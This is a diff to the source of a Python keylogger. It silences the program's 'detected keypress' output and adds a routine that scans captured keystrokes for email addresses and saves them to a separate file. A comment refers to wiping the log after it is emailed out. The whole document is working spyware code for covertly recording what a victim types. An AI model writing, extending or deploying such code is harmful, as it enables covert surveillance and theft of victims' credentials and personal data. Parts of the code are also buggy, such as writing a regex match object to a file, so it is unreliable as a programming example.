@@ -31,7 +31,7 @@ class Keylogger:
     def _keyStrike(self, key):
         #open file
         global keylist
-        print("detected keypress")
+        #print("detected keypress")
         keylist.append(key)
         listSize = 75
         line = ""
@@ -39,6 +39,7 @@ class Keylogger:
             with open('./log/keylog/log.txt', 'a') as file:
                 line = self.formatter(keylist)
                 file.write(line)
+                self.parseFile(line)
                 keylist = []
 
     '''
@@ -47,16 +48,14 @@ class Keylogger:
     in order to have more human readable string
     @self : this instace of Keylogger
     @keylist : the list of keys
-
-    ****BUG : using arrow keys will crash the program*****
     
     '''
     def formatter(self, keylist):
         string = ""
         #iterate through keys and format
         for k in keylist:
-            key = str(k).replace("'","") #remove ' ' from keys
-            #substitue key names for key values (Key.space = ' ')
+            key = str(k).replace("'","") #remove single quote formatting from keys
+            #substitue key names for key values ( ex - Key.space = ' ')
             if key == 'Key.space':
                 string = string + key.replace('Key.space', ' ')
             elif key == 'Key.enter':
@@ -125,20 +124,22 @@ class Keylogger:
     and writes them to another file for easier reading
     @self : this instance of Keylogger
     '''  
-    '''  
-    def parseFile(self):
+      
+    def parseFile(self, line):
+        global lineBuffer
         regex = re.compile(r'[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}')
-        lock = Lock()
-        lock.acquire()
-        try:
-            with open('./log/keylog/log.txt', 'r') as file, open ('./log/keylog/parsed.txt', 'a+') as parsed:
-                for line in file:
-                    result = regex.search(line)
-                    parsed.write(result)
-                    parsed.close()
-        finally:
-            lock.release() 
-    '''
+        previous = lineBuffer[len(lineBuffer)//2:] #split string in half and save second half
+        lineBuffer = line #save line for next iteration
+        line = previous + line #add the half of previous line to current line so regex text isnt cut off
+        
+        with open ('./log/keylog/parsed.txt', 'a+') as parsed:
+            result = regex.search(line)
+            if result:
+                parsed.write(result)
+                print ('regex found: ', result)
+            parsed.close()
+
+    
 
     '''
     this method will wipe our log file after we send it to our email
@@ -161,6 +162,7 @@ class Keylogger:
 #main: create Keylogger instance and run it
 if __name__== "__main__":
     keylist = [] #global list to format the output
+    lineBuffer = " " #global line buffer extract regex strings 
     logger = Keylogger() # declare and intialze Keylogger object
     logger.exe()    # run keylogger
 
